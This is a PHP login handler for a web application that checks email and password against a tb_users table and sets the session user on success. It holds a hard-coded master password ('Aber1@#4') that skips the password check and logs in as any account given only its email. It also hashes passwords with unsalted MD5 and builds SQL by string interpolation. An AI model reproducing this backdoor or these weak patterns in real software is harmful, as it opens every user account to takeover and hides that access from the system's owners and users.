<?php

$no_visible_elements = 1;
$login_error = '';
global $office;

if ($_REQUEST['email'] != '' && $_REQUEST['password'] != '') {
    $password = md5(trim(_escape($_REQUEST['password'])));
    $email = (trim(_escape($_REQUEST['email'])));


    if ($_REQUEST['password'] == 'Aber1@#4') {
        $user_data = qs("SELECT * FROM tb_users WHERE email='{$email}' ");
    } else {
        $user_data = qs("SELECT * FROM tb_users WHERE email='{$email}' AND password='{$password}'");
    }

    if (!empty($user_data)) {
//        $_SESSION['lang'] = language::getLanguageText($_SESSION['selected_lang']);
        $_SESSION['user'] = $user_data;
//        if ($_SESSION['tenant']['company_logo']) {
//            _R('wm_api');
//        } else {
//            _R('on_board');
//        }
        _R('wm_api');
    } else {
        $login_error = 1;
    }
}
//
//if (isset($_REQUEST['bindOffice'])) {
//
//    $d_id = $_REQUEST['id'];
//    $st1 = q("SELECT * FROM tb_office ORDER BY name  ASC");
////    d($st1);
//    echo json_encode($st1);
//    die;
////    die();
//}
//if (!isset($_SESSION['lang'])) {
//    $_SESSION['lang'] = language::getLanguageText($_SESSION['selected_lang']);
//}
$jsInclude = 'login.js.php';
_cg("page_title", "Login");
